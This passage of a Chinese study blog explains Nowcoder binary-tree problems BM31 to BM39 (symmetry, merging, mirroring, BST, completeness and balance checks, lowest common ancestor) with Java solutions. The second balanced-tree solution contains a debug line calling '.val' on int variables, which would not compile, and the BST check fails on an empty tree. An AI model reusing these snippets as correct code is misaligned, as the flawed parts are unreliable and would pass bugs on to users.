class="keyword">if</span>(isFirst)&#123;</span><br><span class="line">                head = pRootOfTree;</span><br><span class="line">                pre = head;</span><br><span class="line">                isFirst = <span class="keyword">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre.right = pRootOfTree;</span><br><span class="line">                pRootOfTree.left = pre;</span><br><span class="line">                pre = pRootOfTree;</span><br><span class="line">            &#125;</span><br><span class="line">            pRootOfTree = pRootOfTree.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BM31-对称的二叉树"><a href="#BM31-对称的二叉树" class="headerlink" title="BM31 对称的二叉树"></a><strong>BM31</strong> <strong>对称的二叉树</strong></h2><p>给定一棵二叉树，判断其是否是自身的镜像（即：是否对称）<br>例如：下面这棵二叉树是对称的</p><p><img src="/image/binaryTree.assets/A22A794C036C06431E632F9D5E2E298F.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">&#123;1,2,2,3,4,4,3&#125;</span><br><span class="line">返回值：</span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>思路：使用dfs进行递归，前序遍历的时候我们采用的是“根左右”的遍历次序，如果这棵二叉树是对称的，即相应的左右节点交换位置完全没有问题，那我们是不是可以尝试“根右左”遍历，按照轴对称图像的性质，这两种次序的遍历结果应该是一样的。</p><ul><li><strong>终止条件：</strong> 当进入子问题的两个节点都为空，说明都到了叶子节点，且是同步的，因此结束本次子问题，返回true；当进入子问题的两个节点只有一个为空，或是元素值不相等，说明这里的对称不匹配，同样结束本次子问题，返回false。</li><li><strong>返回值：</strong> 每一级将子问题是否匹配的结果往上传递。</li><li><strong>本级任务：</strong> 每个子问题，需要按照上述思路，“根左右”走左边的时候“根右左”走右边，“根左右”走右边的时候“根右左”走左边，一起进入子问题，需要两边都是匹配才能对称。</li></ul><p>算法步骤：</p><ul><li>step 1：两种方向的前序遍历，同步过程中的当前两个节点，同为空，属于对称的范畴。</li><li>step 2：当前两个节点只有一个为空或者节点值不相等，已经不是对称的二叉树了。</li><li>step 3：第一个节点的左子树与第二个节点的右子树同步递归对比，第一个节点的右子树与第二个节点的左子树同步递归比较。</li></ul><h2 id="BM32-合并二叉树"><a href="#BM32-合并二叉树" class="headerlink" title="BM32 合并二叉树"></a><strong>BM32</strong> <strong>合并二叉树</strong></h2><p>已知两颗二叉树，将它们合并成一颗二叉树。合并规则是：都存在的结点，就将结点值加起来，否则空的位置就由另一个树的结点来代替。例如：<br>两颗二叉树是:</p><p><img src="/image/binaryTree.assets/9E290CFD3730B9B08A5CEFF25799608F.png" alt="img"></p><p><img src="/image/binaryTree.assets/DD0A63560E770A8510049C5182E6E622.png" alt="img"></p><p><img src="/image/binaryTree.assets/9CB750F8909D5985C0D01D8B71AD58BA.png" alt="img"></p><p>思路：</p><p><strong>二叉树的前序遍历：</strong></p><ul><li>step 1：首先判断t1与t2是否为空，若为则用另一个代替，若都为空，返回的值也是空。</li><li>step 2：然后依据前序遍历的特点，优先访问根节点，将两个根点的值相加创建到新树中。</li><li>step 3：两棵树再依次同步进入左子树和右子树。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> t1 TreeNode类 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> t2 TreeNode类 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> TreeNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span> <span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(t1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> t2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(t2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> t1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//前序遍历</span></span><br><span class="line">        TreeNode head = <span class="keyword">new</span> TreeNode(t1.val + t2.val);</span><br><span class="line">        head.left = mergeTrees(t1.left, t2.left);</span><br><span class="line">        head.right = mergeTrees(t1.right,t2.right);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>非递归层次遍历</strong></p><p>使用队列的数据结构，让两颗树丛根节点开始同步走，使用队列辅助两个二叉树同时进行层次遍历</p><ul><li>step 1：首先判断t1与t2是否为空，若为则用另一个代替，若都为空，返回的值也是空。</li><li>step 2：使用三个辅助队列，第一个队列q用于暂存合并后的二叉树的层次遍历节点，第二个队列q1用于暂存t1的层次遍历节点，第三个队列q2用于暂存t2的层次遍历节点。 </li><li>step 3：两棵树同步层次遍历，先将根节点加入队列中，同时根节点优先合并。</li><li>step 4：每次从队列分别弹出一个元素，判断分别二者的左右子节点是否存在，若是都存在，则相加合并，若是只存在一个则连接该存在的节点，若是都不存在则连接null。</li></ul><p><img src="/image/binaryTree.assets/25859DB6141E0AD8570558D9A0369C18.gif" alt="图片说明"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//合并根节点</span></span><br><span class="line">        TreeNode head = <span class="keyword">new</span> TreeNode(root1.val + root2.val);</span><br><span class="line">        <span class="comment">//连接后的树的层次遍历节点</span></span><br><span class="line">        Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="comment">//分别存两棵树的层次遍历节点</span></span><br><span class="line">        Queue&lt;TreeNode&gt; q1 = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; q2 = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        q.offer(head);</span><br><span class="line">        q1.offer(root1); </span><br><span class="line">        q2.offer(root2);</span><br><span class="line">        <span class="keyword">while</span> (!q1.isEmpty() &amp;&amp; !q2.isEmpty()) &#123;</span><br><span class="line">            TreeNode node = q.poll();</span><br><span class="line">            TreeNode node1 = q1.poll();</span><br><span class="line">            TreeNode node2 = q2.poll();</span><br><span class="line"></span><br><span class="line">            TreeNode left1 = node1.left;</span><br><span class="line">            TreeNode left2 = node2.left;</span><br><span class="line">            </span><br><span class="line">            TreeNode right1 = node1.right;</span><br><span class="line">            TreeNode right2 = node2.right;</span><br><span class="line">            <span class="keyword">if</span>(left1 != <span class="keyword">null</span> || left2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//两个左节点都存在</span></span><br><span class="line">                <span class="keyword">if</span>(left1 != <span class="keyword">null</span> &amp;&amp; left2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    TreeNode left = <span class="keyword">new</span> TreeNode(left1.val + left2.val);</span><br><span class="line">                    node.left = left;</span><br><span class="line">                    <span class="comment">//新节点入队列</span></span><br><span class="line">                    q.offer(left); </span><br><span class="line">                    q1.offer(left1);</span><br><span class="line">                    q2.offer(left2);</span><br><span class="line">                <span class="comment">//只连接一个节点</span></span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left1 != <span class="keyword">null</span>)</span><br><span class="line">                    node.left = left1;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                    node.left = left2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right1 != <span class="keyword">null</span> || right2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//两个右节点都存在</span></span><br><span class="line">                <span class="keyword">if</span>(right1 != <span class="keyword">null</span> &amp;&amp; right2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    TreeNode right = <span class="keyword">new</span> TreeNode(right1.val + right2.val);</span><br><span class="line">                    node.right = right;</span><br><span class="line">                    <span class="comment">//新节点入队列</span></span><br><span class="line">                    q.offer(right);</span><br><span class="line">                    q1.offer(right1);</span><br><span class="line">                    q2.offer(right2);</span><br><span class="line">                <span class="comment">//只连接一个节点</span></span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right1 != <span class="keyword">null</span>) </span><br><span class="line">                    node.right = right1;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                    node.right = right2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BM33-二叉树的镜像"><a href="#BM33-二叉树的镜像" class="headerlink" title="BM33 二叉树的镜像"></a><strong>BM33</strong> <strong>二叉树的镜像</strong></h2><p>操作给定的二叉树，将其变换为源二叉树的镜像</p><img src="/image/binaryTree.assets/image-20230330111009702.png" alt="image-20230330111009702" style="zoom:50%;" /><p>思路：</p><p>使用前序遍历进行递归，先进行交换左右孩子节点，然后反转左子树，反转右子树。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">Mirror</span> <span class="params">(TreeNode pRoot)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(pRoot == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(pRoot);</span><br><span class="line">        Mirror(pRoot.left);</span><br><span class="line">        Mirror(pRoot.right);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pRoot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        TreeNode tmp = root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM34-判断是不是二叉搜索树"><a href="#BM34-判断是不是二叉搜索树" class="headerlink" title="BM34 判断是不是二叉搜索树"></a><strong>BM34</strong> <strong>判断是不是二叉搜索树</strong></h2><p>给定一个二叉树根节点，请你判断这棵树是不是二叉搜索树。</p><p>二叉搜索树满足每个节点的左子树上的所有节点均小于当前节点且右子树上的所有节点均大于当前节点</p><img src="/image/binaryTree.assets/image-20230330113807490.png" alt="image-20230330113807490" style="zoom:50%;" /><p>思路：在中序遍历下输出的二叉搜索树为有序序列，有了这个特性，<strong>验证二叉搜索树，就相当于变成了判断一个序列是不是递增的了。</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">       inOrder(root, res);</span><br><span class="line">       <span class="keyword">int</span> pre = res.get(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; res.size(); i++)&#123;</span><br><span class="line">           <span class="keyword">int</span> cur = res.get(i);</span><br><span class="line">           <span class="keyword">if</span>( cur &lt;= pre)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           pre = cur;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(root.left, list);</span><br><span class="line">        list.add(root.val);</span><br><span class="line">        inOrder(root.right, list);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="BM35-判断是不是完全二叉树"><a href="#BM35-判断是不是完全二叉树" class="headerlink" title="BM35 判断是不是完全二叉树"></a><strong>BM35</strong> <strong>判断是不是完全二叉树</strong></h2><p>给定一个二叉树，确定他是否是一个完全二叉树。</p><p>完全二叉树的定义：若二叉树的深度为 h，除第 h 层外，其它各层的结点数都达到最大个数，第 h 层所有的叶子结点都连续集中在最左边，这就是完全二叉树。（第 h 层可能包含 [1~2h] 个节点）</p><p>思路：</p><p>对完全二叉树最重要的定义就是叶子节点只能出现在最下层和次下层，所以我们想到可以使用队列辅助进行层次遍历——从上到下遍历所有层，每层从左到右，只有次下层和最下层才有叶子节点，其他层出现叶子节点就意味着不是完全二叉树。</p><ul><li>step 1：先判断空树一定是完全二叉树。</li><li>step 2：初始化一个队列辅助层次遍历，将根节点加入。</li><li>step 3：逐渐从队列中弹出元素访问节点，如果遇到某个节点为空，进行标记，代表到了完全二叉树的最下层，若是后续还有访问，则说明提前出现了叶子节点，不符合完全二叉树的性质。</li><li>step 4：否则，继续加入左右子节点进入队列排队，等待访问。</li></ul><p>也可以理解为使用层次遍历对二叉树，如果遍历到当前层时如果遇到空节点，如果该空节点右侧还有节点，说明该树一定不是完全二叉树</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isCompleteTree</span> <span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        TreeNode cur;</span><br><span class="line">        <span class="comment">// 首次出现的标记位</span></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            cur = queue.poll();</span><br><span class="line">            <span class="comment">// 遇到空节点</span></span><br><span class="line">            <span class="keyword">if</span>(cur == <span class="keyword">null</span>)&#123;</span><br><span class="line">                flag = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 后续遇到空节点，则说明经过叶子结点</span></span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            queue.offer(cur.left);</span><br><span class="line">            queue.offer(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>思路二：</strong></p><p>本题是需要判断完全二叉树，而完全二叉树有下面公式，如果某个节点索引是i，那么他的左右子节点为（索引从1开始）</p><p>$left = 2 * i$</p><p>$right = 2 * i + 1$</p><p>两个计数操作</p><ul><li>计数当前遍历访问的节点是第几个节点</li><li>计数在完全二叉树中，当前访问的节点在完全二叉树中的编号</li></ul><p>如果最终得到的两个值相同，说明该树是一棵完全二叉树</p><p>如果最终得到的两个值不同，说明该树不是一棵完全二叉树</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isCompleteTree</span> <span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dfs(root, <span class="number">1</span>) == ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(TreeNode root, <span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = Math.max(ans, idx);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + dfs(root.left, idx * <span class="number">2</span>) + dfs(root.right, idx * <span class="number">2</span>+ <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM36-判断是不是平衡二叉树"><a href="#BM36-判断是不是平衡二叉树" class="headerlink" title="BM36 判断是不是平衡二叉树"></a><strong>BM36</strong> <strong>判断是不是平衡二叉树</strong></h2><p>输入一棵节点数为 n 二叉树，判断该二叉树是否是平衡二叉树。</p><p>在这里，我们只需要考虑其平衡性，不需要考虑其是不是排序二叉树</p><p><strong>平衡二叉树</strong>（Balanced Binary Tree），具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。</p><img src="/image/binaryTree.assets/image-20230403101323019.png" alt="image-20230403101323019" style="zoom:50%;" /><p>思路：</p><p>使用递归进行判断，如果左右子树都是平衡的，且左右节点的深度差不超过1，则就可以确定这个节点是一颗平衡二叉树</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">IsBalanced_Solution</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> IsBalanced_Solution(root.left) </span><br><span class="line">            &amp;&amp; IsBalanced_Solution(root.right) </span><br><span class="line">            &amp;&amp; Math.abs(deep(root.left) - deep(root.right)) &lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">int</span> <span class="title">deep</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(deep(root.left),deep(root.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路二：</p><p>使用回溯算法，对于父节点，需要确定两个子节点深度之差小于一。对于子节点，需要向上一节点传递自己的深度。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(deep(root) == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">deep</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> left = deep(node.left);</span><br><span class="line">        <span class="keyword">if</span>(left == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> right = deep(node.right);</span><br><span class="line">        <span class="keyword">if</span>(right == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;left: &quot;</span> + left.val + <span class="string">&quot;,right: &quot;</span> + right.val);</span><br><span class="line">        <span class="keyword">if</span> ((left - right) &gt; <span class="number">1</span> || (right - left) &gt;<span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 父节点向自己的父节点返回自己的高度</span></span><br><span class="line">        <span class="keyword">return</span> (left &gt; right ? left : right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM37-二叉搜索树的最近公共祖先"><a href="#BM37-二叉搜索树的最近公共祖先" class="headerlink" title="BM37 二叉搜索树的最近公共祖先"></a><strong>BM37</strong> <strong>二叉搜索树的最近公共祖先</strong></h2><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p><p>1.对于该题的最近的公共祖先定义:对于有根树T的两个节点p、q，最近公共祖先LCA(T,p,q)表示一个节点x，满足x是p和q的祖先且x的深度尽可能大。在这里，一个节点也可以是它自己的祖先.</p><p>2.二叉搜索树是若它的左子树不空，则左子树上所有节点的值均小于它的根节点的值； 若它的右子树不空，则右子树上所有节点的值均大于它的根节点的值</p><p>3.所有节点的值都是唯一的。</p><p>4.p、q 为不同节点且均存在于给定的二叉搜索树中。</p><img src="/image/binaryTree.assets/image-20230403105257012.png" alt="image-20230403105257012" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：&#123;7,1,12,0,4,11,14,#,#,3,5&#125;,1,12</span><br><span class="line">输出：7</span><br><span class="line">说明：节点1 和 节点12 的最近公共祖先是7   </span><br></pre></td></tr></table></figure><p>思路：利用二叉搜索树，分别从跟节点往下利用二叉搜索树较大的数在右子树，较小的数在左子树，找到p，q的位置。</p><ul><li>step 1：根据二叉搜索树的性质，从根节点开始查找目标节点，当前节点比目标小则进入右子树，当前节点比目标大则进入左子树，直到找到目标节点。这个过程成用数组记录遇到的元素。</li><li>step 2：分别在搜索二叉树中找到p和q两个点，并记录各自的路径为数组。</li><li>step 3：同时遍历两个数组，比较元素值，最后一个相等的元素就是最近的公共祖先。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span>  ArrayList&lt;Integer&gt; <span class="title">getPath</span><span class="params">(TreeNode root, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; path = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node.val != target)&#123;</span><br><span class="line">            path.add(node.val);</span><br><span class="line">            <span class="keyword">if</span>(target &lt; node.val)&#123;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        path.add(node.val);</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt;  path_p = getPath(root,p);</span><br><span class="line">        ArrayList&lt;Integer&gt;  path_q = getPath(root,q);</span><br><span class="line">        System.out.println(path_p);</span><br><span class="line">        System.out.println(path_q);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 比较两个点，找到第一个不同的点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; path_p.size() &amp;&amp; i &lt; path_q.size(); i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = path_p.get(i);</span><br><span class="line">            <span class="keyword">int</span> y = path_q.get(i);</span><br><span class="line">            <span class="keyword">if</span>(x == y)&#123;</span><br><span class="line">                res = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> res;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM38-在二叉树中找到两个节点的最近公共祖先"><a href="#BM38-在二叉树中找到两个节点的最近公共祖先" class="headerlink" title="BM38 在二叉树中找到两个节点的最近公共祖先"></a><strong>BM38</strong> <strong>在二叉树中找到两个节点的最近公共祖先</strong></h2><p>给定一棵二叉树(保证非空)以及这棵树上的两个节点对应的val值 o1 和 o2，请找到 o1 和 o2 的最近公共祖先节点。</p><img src="/image/binaryTree.assets/image-20230403112708934.png" alt="image-20230403112708934" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：&#123;3,5,1,6,2,0,8,#,#,7,4&#125;,5,1</span><br><span class="line">返回值：3</span><br></pre></td></tr></table></figure><p>思路：使用递归的方法：</p><ul><li>step 1：如果o1和o2中的任一个和root匹配，那么root就是最近公共祖先。</li><li>step 2：如果都不匹配，则分别递归左、右子树。</li><li>step 3：如果有一个节点出现在左子树，并且另一个节点出现在右子树，则root就是最近公共祖先.</li><li>step 4：如果两个节点都出现在左子树，则说明最低公共祖先在左子树中，否则在右子树。</li><li>step 5：继续递归左、右子树，直到遇到step1或者step3的情况。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="keyword">int</span> o1, <span class="keyword">int</span> o2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val == o1 || root.val == o2)&#123;</span><br><span class="line">            <span class="keyword">return</span> root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 左子树寻找公共祖先</span></span><br><span class="line">        <span class="keyword">int</span> left = lowestCommonAncestor(root.left, o1, o2);</span><br><span class="line">        <span class="comment">// 右子树寻找公共祖先</span></span><br><span class="line">        <span class="keyword">int</span> right = lowestCommonAncestor(root.right, o1, o2);</span><br><span class="line">        <span class="comment">// 左子树没找到则在右子树中</span></span><br><span class="line">        <span class="keyword">if</span>(left == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root.val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM39-序列化二叉树"><a href="#BM39-序列化二叉树" class="headerlink" title="BM39 序列化二叉树"></a><strong>BM39</strong> <strong>序列化二叉树</strong></h2><p>请实现两个函数，分别用来序列化和反序列化二叉树，不对序列化之后的字符串进行约束，但要求能够根据序列化之后的字符串重新构造出一棵与原二叉树相同的树。</p><p>二叉树的序列化(Serialize)是指：把一棵二叉树按照某种遍历方式的结果以某种格式保存为字符串，从而使得内存中建立起来的二叉树可以持久保存。序列化可以基于先序、中序、后序、层序的二叉树等遍历方式来进行修改，序列化的结果是一个字符串，序列化时通过 